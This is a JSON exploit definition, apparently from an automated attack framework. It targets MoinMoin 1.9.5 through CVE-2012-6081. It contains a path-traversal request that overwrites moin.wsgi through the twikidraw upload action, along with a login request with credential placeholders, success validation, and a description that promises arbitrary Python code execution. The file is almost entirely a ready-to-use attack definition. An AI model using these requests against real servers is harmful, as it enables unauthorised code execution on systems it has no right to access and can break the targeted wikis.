{
   "informations" : {
      "METHOD" : "GET",
      "PATH" : "action=twikidraw&do=modify&target=../../../../moin.wsgi&action=twikidraw&do=save&ticket=__TICKET__&target=../../../../moin.wsgi&",
      "REFERENCES" : [
         "http://hg.moinmo.in/moin/1.9/rev/7e7e1cbb9d3f",
         "http://wiki.python.org/moin/WikiAttack2013"
      ],
      "TYPE" : "MSF",
      "PLATFORM" : "UNIX",
      "VARIABLES" : {
         "TICKET" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "NAME" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "PASSWORD" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         }
      },
      "MSF_MODULE" : "moinmoin_twikidraw",
      "CVE" : "CVE-2012-6081",
      "TITLE" : "MoinMoin twikidraw Action Traversal File Upload",
      "DESCRIPTION" : "\n\n          This module exploits a vulnerability in MoinMoin 1.9.5. The vulnerability\n\n        exists on the manage of the twikidraw actions, where a traversal path can be used\n\n        in order to upload arbitrary files. Exploitation is achieved on Apached/mod_wsgi\n\n        configurations by overwriting moin.wsgi, which allows to execute arbitrary python\n\n        code, as exploited in the wild on July, 2012. This module is \"ManualRanking,\" and\n\n        the user is warned to use this module at his own risk since it will overwrite the\n\n        moin.wsgi file, required for the correct working of the MoinMoin wiki. While the\n\n        exploit will try to restore the attacked application at post exploitation, successful\n\n        restoration cannot be guaranteed.\n\n      ",
      "name" : "MoinmoinTwikidraw",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "TEXT" : "Sending Exploit #1 Request : [POST] /WikiSandBox",
            "PAYLOAD" : "action=login&name=__USERNAME__&password=__PASSWORD__&login=Login",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "METHOD" : "POST",
            "PATH" : "WikiSandBox"
         }
      },
      "OSVDB" : 88825,
      "PAYLOAD" : "action=login&name=__NAME__&password=__PASSWORD__&login=Login&"
   },
   "detection" : {},
   "path" : "action=twikidraw&do=modify&target=../../../../moin.wsgi&action=twikidraw&do=save&ticket=__TICKET__&target=../../../../moin.wsgi&",
   "type" : "MSF",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "cve" : "CVE-2012-6081",
   "name" : "MoinmoinTwikidraw",
   "msf_module" : "moinmoin_twikidraw",
   "references" : [
      "http://hg.moinmo.in/moin/1.9/rev/7e7e1cbb9d3f",
      "http://wiki.python.org/moin/WikiAttack2013"
   ],
   "requests" : {
      "EXPLOIT1" : {
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "TEXT" : "Sending Exploit #1 Request : [POST] /WikiSandBox",
         "PAYLOAD" : "action=login&name=__USERNAME__&password=__PASSWORD__&login=Login",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "METHOD" : "POST",
         "PATH" : "WikiSandBox"
      }
   },
   "osvdb" : 88825,
   "platform" : "UNIX",
   "method" : "GET",
   "description" : "\n\n          This module exploits a vulnerability in MoinMoin 1.9.5. The vulnerability\n\n        exists on the manage of the twikidraw actions, where a traversal path can be used\n\n        in order to upload arbitrary files. Exploitation is achieved on Apached/mod_wsgi\n\n        configurations by overwriting moin.wsgi, which allows to execute arbitrary python\n\n        code, as exploited in the wild on July, 2012. This module is \"ManualRanking,\" and\n\n        the user is warned to use this module at his own risk since it will overwrite the\n\n        moin.wsgi file, required for the correct working of the MoinMoin wiki. While the\n\n        exploit will try to restore the attacked application at post exploitation, successful\n\n        restoration cannot be guaranteed.\n\n      ",
   "title" : "MoinMoin twikidraw Action Traversal File Upload",
   "variables" : {
      "TICKET" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "NAME" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "PASSWORD" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      }
   },
   "payload" : "action=login&name=__NAME__&password=__PASSWORD__&login=Login&"
}
